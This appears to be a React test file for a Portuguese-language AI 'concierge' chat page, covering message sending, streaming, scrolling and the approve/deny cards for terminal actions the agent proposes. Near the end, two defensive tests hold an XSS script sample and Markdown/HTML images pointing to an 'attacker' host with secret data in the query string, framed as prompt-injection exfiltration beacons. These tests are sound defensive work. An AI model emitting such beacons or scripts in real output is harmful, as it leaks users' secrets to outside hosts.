// @vitest-environment jsdom
import { cleanup, fireEvent, render, screen, waitFor } from '@testing-library/react';
import { afterEach, beforeEach, expect, it, vi } from 'vitest';
import { ChatPage } from './ChatPage';
import type { ChatAction, ChatMessage } from '../lib/types';

const chatMock = vi.fn();
const sendMock = vi.fn();
const streamMock = vi.fn();
const decideMock = vi.fn();

vi.mock('../lib/api', () => {
  // Same signature as the real one: the page shows `message`, so a stand-in that swallows it would
  // make the pt-BR server message untestable.
  class ApiError extends Error {
    constructor(
      public status: number,
      message: string,
      public code?: string,
    ) {
      super(message);
    }
  }
  return {
    ApiError,
    api: { chat: (...a: unknown[]) => chatMock(...a), sendChatMessage: (...a: unknown[]) => sendMock(...a), decideChatAction: (...a: unknown[]) => decideMock(...a) },
  };
});
vi.mock('../lib/chat', () => ({ useChatStream: (...a: unknown[]) => streamMock(...a) }));

const msg = (over: Partial<ChatMessage> & { id: string }): ChatMessage => ({
  conversation_id: 'c1',
  role: 'user',
  text: '',
  error_code: null,
  created_at: '2026-09-21T00:00:00.000Z',
  ...over,
});

const action = (over: Partial<ChatAction> & { id: string }): ChatAction => ({
  tool: 'send_input',
  args: { tab_id: 't1', text: 'npm test' },
  class: 'write',
  status: 'pending',
  machine_id: null,
  project_id: null,
  tab_id: 't1',
  summary: 'digitar `npm test` na aba Terminal 2 do projeto reactivando, no macbook m3',
  created_at: '2026-09-21T00:00:00.000Z',
  ...over,
});

beforeEach(() => {
  chatMock.mockReset();
  sendMock.mockReset();
  streamMock.mockReset();
  decideMock.mockReset();
  chatMock.mockResolvedValue({ conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null }, messages: [msg({ id: 'm1', role: 'user', text: 'oi' })], actions: [] });
  sendMock.mockResolvedValue({ message: msg({ id: 'm3', role: 'assistant', text: 'pronto' }) });
  streamMock.mockReturnValue({ events: [], connected: true });
});

afterEach(() => cleanup());

/** Stubs `matchMedia('(pointer: coarse)')` for one test and hands back a restorer, so a failure
 * partway through a test can never leave `window` different from how this file found it. */
function mockPointer(coarse: boolean): () => void {
  const original = window.matchMedia;
  window.matchMedia = ((query: string) => ({ matches: coarse && query.includes('coarse') })) as typeof window.matchMedia;
  return () => {
    window.matchMedia = original;
  };
}

it('shows the stored conversation', async () => {
  render(<ChatPage />);
  expect(await screen.findByText('oi')).toBeTruthy();
});

it('sends what was typed and clears the box', async () => {
  render(<ChatPage />);
  const box = await screen.findByPlaceholderText(/pergunte/i);
  fireEvent.change(box, { target: { value: 'o que está rodando?' } });
  fireEvent.click(screen.getByRole('button', { name: /enviar/i }));
  await waitFor(() => expect(sendMock).toHaveBeenCalledWith('o que está rodando?'));
  expect((box as HTMLTextAreaElement).value).toBe('');
});

it('clears the box as soon as the message is sent, not when the answer lands', async () => {
  // The POST only resolves when the whole answer is written, which can take a minute.
  let resolveSend: (v: unknown) => void = () => {};
  sendMock.mockImplementationOnce(() => new Promise((r) => (resolveSend = r)));

  render(<ChatPage />);
  const box = (await screen.findByPlaceholderText(/pergunte/i)) as HTMLTextAreaElement;
  fireEvent.change(box, { target: { value: 'quais máquinas estão online?' } });
  fireEvent.click(screen.getByRole('button', { name: /enviar/i }));

  await waitFor(() => expect(box.value).toBe(''));
  resolveSend({ message: { id: 'm9', role: 'assistant', text: 'pronto', error_code: null } });
});

it('gives the text back when the send fails, so nothing is lost', async () => {
  sendMock.mockRejectedValueOnce(new Error('rede caiu'));

  render(<ChatPage />);
  const box = (await screen.findByPlaceholderText(/pergunte/i)) as HTMLTextAreaElement;
  fireEvent.change(box, { target: { value: 'não perde isso' } });
  fireEvent.click(screen.getByRole('button', { name: /enviar/i }));

  await waitFor(() => expect(box.value).toBe('não perde isso'));
});

it('re-reads the conversation whenever the socket (re)connects', async () => {
  // Review Focus 5: /ws/chat carries no history, so a reconnect mid-answer must refetch.
  streamMock.mockImplementation((onReconnect: () => void) => {
    onReconnect();
    return { events: [], connected: true };
  });
  render(<ChatPage />);
  await waitFor(() => expect(chatMock.mock.calls.length).toBeGreaterThanOrEqual(2));
});

it('says when an answer did not finish', async () => {
  chatMock.mockResolvedValueOnce({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [msg({ id: 'm1', role: 'assistant', text: 'comecei', error_code: 'RUNNER_FAILED' })],
  });
  render(<ChatPage />);
  expect(await screen.findByText(/não terminou/i)).toBeTruthy();
});

it('drops the delta trail from before a reset, keeping only what streamed after it', async () => {
  // The server retries a run on a fresh CLI session and throws away what streamed before the
  // reset; the bubble must never glue the abandoned half-answer to the real one.
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [msg({ id: 'm2', role: 'assistant', text: '' })],
  });
  streamMock.mockReturnValue({
    events: [
      { type: 'delta', message_id: 'm2', delta: 'resposta abandonada' },
      { type: 'reset', message_id: 'm2' },
      { type: 'delta', message_id: 'm2', delta: 'resposta nova' },
    ],
    connected: true,
  });
  render(<ChatPage />);
  expect(await screen.findByText('resposta nova')).toBeTruthy();
  expect(screen.queryByText(/resposta abandonada/)).toBeNull();
});

it('does not wait for ever on an empty row left behind by a dead run', async () => {
  // A process death mid-run (every deploy has one) leaves an empty assistant row. Nothing will ever
  // fill it, so it must read as a failure instead of saying "pensando…" for the rest of time.
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [msg({ id: 'm1', role: 'user', text: 'oi' }), msg({ id: 'm2', role: 'assistant', text: '' })],
  });
  render(<ChatPage />);
  expect(await screen.findByText(/não terminou/i)).toBeTruthy();
  expect(screen.queryByText(/pensando/i)).toBeNull();
});

it('says "pensando…" while the message it is answering is the live one', async () => {
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [msg({ id: 'm1', role: 'user', text: 'oi' }), msg({ id: 'm2', role: 'assistant', text: '' })],
  });
  // The run was announced over the socket: this row is being written right now.
  streamMock.mockReturnValue({ events: [{ type: 'message', message: msg({ id: 'm2', role: 'assistant', text: '' }) }], connected: true });
  render(<ChatPage />);
  expect(await screen.findByText(/pensando/i)).toBeTruthy();
  expect(screen.queryByText(/não terminou/i)).toBeNull();
});

it('scrolls the list to the newest message when one arrives', async () => {
  // Past one viewport the user would otherwise send a message and see nothing move.
  let deliver: (e: unknown) => void = () => {};
  streamMock.mockImplementation((_onReconnect: () => void, onEvent: (e: unknown) => void) => {
    deliver = onEvent;
    return { events: [], connected: true };
  });
  chatMock
    .mockResolvedValueOnce({ conversation: { id: 'c1' }, messages: [msg({ id: 'm1', role: 'user', text: 'oi' })] })
    .mockResolvedValue({ conversation: { id: 'c1' }, messages: [msg({ id: 'm1', role: 'user', text: 'oi' }), msg({ id: 'm2', role: 'assistant', text: 'pronto' })] });

  render(<ChatPage />);
  const list = await screen.findByRole('list');
  // jsdom lays nothing out, so the scrollable height is stubbed; what is asserted is that the page
  // pins the list to its bottom on new content.
  Object.defineProperty(list, 'scrollHeight', { value: 480, configurable: true });
  expect(list.scrollTop).toBe(0);

  deliver({ type: 'message', message: msg({ id: 'm2', role: 'assistant', text: 'pronto' }) });
  await waitFor(() => expect(list.scrollTop).toBe(480));
});

it('does not send on Enter with a coarse pointer (a touch keyboard), and keeps the text', async () => {
  const restore = mockPointer(true);
  try {
    render(<ChatPage />);
    const box = (await screen.findByPlaceholderText(/pergunte/i)) as HTMLTextAreaElement;
    fireEvent.change(box, { target: { value: 'oi' } });
    fireEvent.keyDown(box, { key: 'Enter' });
    expect(sendMock).not.toHaveBeenCalled();
    expect(box.value).toBe('oi');
  } finally {
    restore();
  }
});

it('still sends on Enter with a fine pointer, so desktop keeps today\'s behaviour', async () => {
  const restore = mockPointer(false);
  try {
    render(<ChatPage />);
    const box = (await screen.findByPlaceholderText(/pergunte/i)) as HTMLTextAreaElement;
    fireEvent.change(box, { target: { value: 'oi' } });
    fireEvent.keyDown(box, { key: 'Enter' });
    await waitFor(() => expect(sendMock).toHaveBeenCalledWith('oi'));
  } finally {
    restore();
  }
});

it('leaves the scroll position alone once the reader has scrolled away from the bottom', async () => {
  let deliver: (e: unknown) => void = () => {};
  streamMock.mockImplementation((_onReconnect: () => void, onEvent: (e: unknown) => void) => {
    deliver = onEvent;
    return { events: [], connected: true };
  });
  chatMock
    .mockResolvedValueOnce({ conversation: { id: 'c1' }, messages: [msg({ id: 'm1', role: 'user', text: 'oi' })] })
    .mockResolvedValue({ conversation: { id: 'c1' }, messages: [msg({ id: 'm1', role: 'user', text: 'oi' }), msg({ id: 'm2', role: 'assistant', text: 'pronto' })] });

  render(<ChatPage />);
  const list = await screen.findByRole('list');
  // Far from the bottom by isNearBottom's own rule (100 + 200 < 1000 - 48). The scroll event is
  // the only thing that can tell the page the reader moved: nothing here reads live geometry.
  Object.defineProperty(list, 'scrollHeight', { value: 1000, configurable: true });
  Object.defineProperty(list, 'clientHeight', { value: 200, configurable: true });
  Object.defineProperty(list, 'scrollTop', { value: 100, configurable: true, writable: true });
  fireEvent.scroll(list);

  deliver({ type: 'message', message: msg({ id: 'm2', role: 'assistant', text: 'pronto' }) });
  await screen.findByText('pronto');
  expect(list.scrollTop).toBe(100);
});

it('returns to the bottom on send, even if the reader had scrolled away', async () => {
  // load() runs again after a successful send: it must resolve a genuinely new list (not the same
  // object `mockResolvedValue` would keep handing back) for React to see `messages` change and the
  // pin effect to run at all.
  chatMock
    .mockResolvedValueOnce({ conversation: { id: 'c1' }, messages: [msg({ id: 'm1', role: 'user', text: 'oi' })] })
    .mockResolvedValue({ conversation: { id: 'c1' }, messages: [msg({ id: 'm1', role: 'user', text: 'oi' }), msg({ id: 'm3', role: 'assistant', text: 'pronto' })] });
  render(<ChatPage />);
  const list = await screen.findByRole('list');
  Object.defineProperty(list, 'scrollHeight', { value: 480, configurable: true });
  Object.defineProperty(list, 'clientHeight', { value: 200, configurable: true });
  Object.defineProperty(list, 'scrollTop', { value: 50, configurable: true, writable: true });
  fireEvent.scroll(list); // reader scrolled up: the page stops following

  const box = (await screen.findByPlaceholderText(/pergunte/i)) as HTMLTextAreaElement;
  fireEvent.change(box, { target: { value: 'oi' } });
  fireEvent.click(screen.getByRole('button', { name: /enviar/i }));

  await waitFor(() => expect(list.scrollTop).toBe(480));
});

it('re-reads the conversation when sending fails, so no bubble is left waiting', async () => {
  // A 503 (the chat is not configured) deletes the empty assistant row the server had announced.
  const { ApiError } = await import('../lib/api');
  sendMock.mockRejectedValueOnce(new ApiError(503, 'O chat não está configurado neste servidor', 'CONCIERGE_DISABLED'));
  render(<ChatPage />);
  const box = await screen.findByPlaceholderText(/pergunte/i);
  fireEvent.change(box, { target: { value: 'oi' } });
  fireEvent.click(screen.getByRole('button', { name: /enviar/i }));

  expect(await screen.findByText(/não está configurado/i)).toBeTruthy();
  await waitFor(() => expect(chatMock.mock.calls.length).toBeGreaterThanOrEqual(2));
});

it('does not call a tool-only phase a dead run', async () => {
  // A page opened (or a second tab) after the run began never sees the `message` event that
  // announced it, and a tool-only phase can run for tens of seconds with no delta: the failure line
  // beside the tool chips would be a lie about a perfectly healthy run.
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [msg({ id: 'm1', role: 'user', text: 'o que está rodando?' }), msg({ id: 'm2', role: 'assistant', text: '' })],
  });
  streamMock.mockReturnValue({
    events: [{ type: 'action', message_id: 'm2', tool: 'list_tabs', tool_use_id: 'tu_1', args: {} }],
    connected: true,
  });
  render(<ChatPage />);

  expect(await screen.findByText('list_tabs')).toBeTruthy();
  expect(screen.queryByText(/não terminou/i)).toBeNull();
  expect(screen.getByText(/pensando/i)).toBeTruthy();
});

it('shows a pending action as a sentence about the real world, with Autorizar and Recusar', async () => {
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [],
    actions: [action({ id: 'act1' })],
  });
  render(<ChatPage />);

  expect(await screen.findByText('digitar `npm test` na aba Terminal 2 do projeto reactivando, no macbook m3')).toBeTruthy();
  expect(screen.getByRole('button', { name: /autorizar/i })).toBeTruthy();
  expect(screen.getByRole('button', { name: /recusar/i })).toBeTruthy();
});

it('the trail survives a reload: an old denied row and a newer pending one for the same proposal both show, keyed by their own id', async () => {
  // Task 4's gate depends on exactly this: a lapsed denial leaves the old row beside a new pending
  // one, so the page must never assume one row per proposal or per tool.
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [],
    actions: [action({ id: 'act0', status: 'denied' }), action({ id: 'act1', status: 'pending' })],
  });
  render(<ChatPage />);

  expect(await screen.findByText(/recusado/i)).toBeTruthy();
  expect(screen.getByRole('button', { name: /autorizar/i })).toBeTruthy(); // the newer question still asks
});

it('a denied action reads as denied, with no buttons', async () => {
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [],
    actions: [action({ id: 'act0', status: 'denied' })],
  });
  render(<ChatPage />);

  expect(await screen.findByText(/recusado/i)).toBeTruthy();
  expect(screen.queryByRole('button', { name: /autorizar/i })).toBeNull();
  expect(screen.queryByRole('button', { name: /recusar/i })).toBeNull();
});

it('clicking Autorizar calls the decision endpoint and the buttons go away', async () => {
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [],
    actions: [action({ id: 'act1' })],
  });
  // The real endpoint returns the raw decided row, not the enriched card — no `summary` here; the
  // page must keep the card's already-known summary and apply only the new status.
  decideMock.mockResolvedValue({ action: { id: 'act1', status: 'approved' }, message: msg({ id: 'm9', role: 'assistant', text: 'Feito.' }) });
  render(<ChatPage />);

  fireEvent.click(await screen.findByRole('button', { name: /autorizar/i }));

  await waitFor(() => expect(decideMock).toHaveBeenCalledWith('act1', 'approve'));
  await waitFor(() => expect(screen.queryByRole('button', { name: /autorizar/i })).toBeNull());
  expect(screen.queryByRole('button', { name: /recusar/i })).toBeNull();
  expect(await screen.findByText(/autorizado/i)).toBeTruthy();
  // The decision endpoint's response carries no `summary` (that field only ever comes from GET
  // /api/chat or the confirmation event) — the sentence must still be on screen, not dropped.
  expect(screen.getByText('digitar `npm test` na aba Terminal 2 do projeto reactivando, no macbook m3')).toBeTruthy();
});

it('clicking Recusar calls the decision endpoint with the refusal and the buttons go away', async () => {
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [],
    actions: [action({ id: 'act1' })],
  });
  decideMock.mockResolvedValue({ action: { id: 'act1', status: 'denied' }, message: msg({ id: 'm9', role: 'assistant', text: 'Ok.' }) });
  render(<ChatPage />);

  fireEvent.click(await screen.findByRole('button', { name: /recusar/i }));

  await waitFor(() => expect(decideMock).toHaveBeenCalledWith('act1', 'deny'));
  expect(await screen.findByText(/recusado/i)).toBeTruthy();
  expect(screen.queryByRole('button', { name: /autorizar/i })).toBeNull();
});

it('shows the server\'s pt-BR note when the decision is queued behind a busy run, not an error', async () => {
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [],
    actions: [action({ id: 'act1' })],
  });
  decideMock.mockResolvedValue({
    action: { id: 'act1', status: 'approved' },
    queued: true,
    note: 'A decisão foi registrada e será aplicada assim que a resposta atual do concierge terminar.',
  });
  render(<ChatPage />);

  fireEvent.click(await screen.findByRole('button', { name: /autorizar/i }));

  expect(await screen.findByText(/será aplicada assim que a resposta atual/i)).toBeTruthy();
  expect(screen.queryByText(/não foi possível/i)).toBeNull(); // not treated as a failure
});

it('a confirmation event on the socket adds the question as a card without a refetch', async () => {
  let deliver: (e: unknown) => void = () => {};
  streamMock.mockImplementation((_onReconnect: () => void, onEvent: (e: unknown) => void) => {
    deliver = onEvent;
    return { events: [], connected: true };
  });
  render(<ChatPage />);
  await waitFor(() => expect(chatMock).toHaveBeenCalledTimes(1));

  deliver({
    type: 'confirmation',
    action_id: 'act1',
    tool: 'send_input',
    args: { tab_id: 't1', text: 'npm test' },
    class: 'write',
    machine_id: null,
    project_id: null,
    tab_id: 't1',
    summary: 'digitar `npm test` na aba Terminal 2 do projeto reactivando, no macbook m3',
    // The event carries the row's own timestamp — the thread places the card by it.
    created_at: '2026-09-21T00:00:01.000Z',
  });

  expect(await screen.findByText('digitar `npm test` na aba Terminal 2 do projeto reactivando, no macbook m3')).toBeTruthy();
  expect(chatMock).toHaveBeenCalledTimes(1); // no refetch — the event alone carries the card
});

it('a decision event on the socket updates the card by its action id, for a decision made in another tab', async () => {
  let deliver: (e: unknown) => void = () => {};
  streamMock.mockImplementation((_onReconnect: () => void, onEvent: (e: unknown) => void) => {
    deliver = onEvent;
    return { events: [], connected: true };
  });
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [],
    actions: [action({ id: 'act1' })],
  });
  render(<ChatPage />);
  await screen.findByRole('button', { name: /autorizar/i });

  deliver({ type: 'decision', action_id: 'act1', status: 'denied' });

  await waitFor(() => expect(screen.queryByRole('button', { name: /autorizar/i })).toBeNull());
  expect(await screen.findByText(/recusado/i)).toBeTruthy();
});

it("renders the concierge's answer as Markdown, not as a literal", async () => {
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [msg({ id: 'm2', role: 'assistant', text: '**pronto**' })],
  });
  render(<ChatPage />);

  const el = await screen.findByText('pronto');
  expect(el.tagName).toBe('STRONG');
});

it('never parses the user\'s own words as Markdown', async () => {
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [msg({ id: 'm1', role: 'user', text: '**oi**' })],
  });
  render(<ChatPage />);

  // What the user typed is what the user sees: no bold, and the asterisks are still there.
  expect(await screen.findByText('**oi**')).toBeTruthy();
  expect(document.querySelector('strong')).toBeNull();
});

it('sanitises the answer: a script tag in the model text never becomes a script element', async () => {
  // The concierge reads real terminal screens, so its text can carry anything a prompt injected
  // into a terminal produced.
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [msg({ id: 'm2', role: 'assistant', text: 'olha isso <script>alert(1)</script>' })],
  });
  render(<ChatPage />);

  await screen.findByText(/olha isso/);
  expect(document.querySelector('script')).toBeNull();
});

it('renders no image from an answer: an <img> in the model text would be a GET nobody clicked', async () => {
  // No CSP in this repo, so a remote image URL the model wrote would be fetched on render — an
  // exfiltration beacon whose query string the model chooses.
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [msg({ id: 'm2', role: 'assistant', text: 'olha isso ![](https://attacker/?d=segredo)\n\n<img src="https://attacker/?d=raw">' })],
  });
  render(<ChatPage />);

  await screen.findByText(/olha isso/);
  expect(document.querySelectorAll('img')).toHaveLength(0);
});

it('puts a card between the two messages it was proposed between', async () => {
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [
      msg({ id: 'm1', role: 'user', text: 'roda o teste', created_at: '2026-09-21T00:00:00.000Z' }),
      // The answer carries a Markdown bullet list of its own, which renders as a real `ul` nested in
      // the thread: the thread is found by its name and read by its direct children, so the answer's
      // own list is never mistaken for a second thread nor for a turn of the conversation.
      msg({ id: 'm2', role: 'assistant', text: 'feito:\n\n- um\n- dois', created_at: '2026-09-21T00:00:02.000Z' }),
    ],
    actions: [action({ id: 'act1', created_at: '2026-09-21T00:00:01.000Z' })],
  });
  render(<ChatPage />);
  await screen.findByRole('button', { name: /autorizar/i });

  const thread = screen.getByRole('list', { name: 'Conversa' });
  const items = Array.from(thread.children).map((li) => li.textContent ?? '');
  expect(items).toHaveLength(3);
  expect(items[0]).toContain('roda o teste');
  expect(items[1]).toContain('digitar `npm test`');
  expect(items[2]).toContain('feito');
  expect(thread.querySelector('ul')).toBeTruthy(); // the fixture's bullets really are on screen
});

it('is one single thread, not a message list with a card list glued below it', async () => {
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [
      msg({ id: 'm1', role: 'user', text: 'roda o teste', created_at: '2026-09-21T00:00:00.000Z' }),
      // Bullets in the answer again: what this pins is one *thread*, not one list element in the
      // document — a rendered answer is free to contain as many lists as the model wrote.
      msg({ id: 'm2', role: 'assistant', text: 'feito:\n\n- um\n- dois', created_at: '2026-09-21T00:00:02.000Z' }),
    ],
    actions: [action({ id: 'act1', created_at: '2026-09-21T00:00:01.000Z' })],
  });
  render(<ChatPage />);
  await screen.findByRole('button', { name: /autorizar/i });

  expect(screen.getAllByRole('list', { name: 'Conversa' })).toHaveLength(1);
  // …and the fixture does put a second, unnamed list on the page, so the assertion above is scoped
  // work and not a restatement of "there is only one list".
  expect(screen.getAllByRole('list').length).toBeGreaterThan(1);

  // The two assertions above both survive a second, *unlabelled* list of cards glued below the
  // thread — exactly the layout this test exists to forbid. So: every card is a row of the named
  // thread itself, wherever else a list may appear on the page.
  const thread = screen.getByRole('list', { name: 'Conversa' });
  const cards = screen.getAllByRole('button', { name: /autorizar/i });
  expect(cards).toHaveLength(1); // the fixture's one pending card really is on screen
  for (const button of cards) {
    const row = button.closest('li');
    expect(row).not.toBeNull();
    expect(row?.parentElement).toBe(thread);
  }
});

it('renders a streamed delta as Markdown too, while it is still being written', async () => {
  chatMock.mockResolvedValue({
    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
    messages: [msg({ id: 'm2', role: 'assistant', text: '' })],
  });
  streamMock.mockReturnValue({ events: [{ type: 'delta', message_id: 'm2', delta: '**parcial**' }], connected: true });
  render(<ChatPage />);

  const el = await screen.findByText('parcial');
  expect(el.tagName).toBe('STRONG');
});
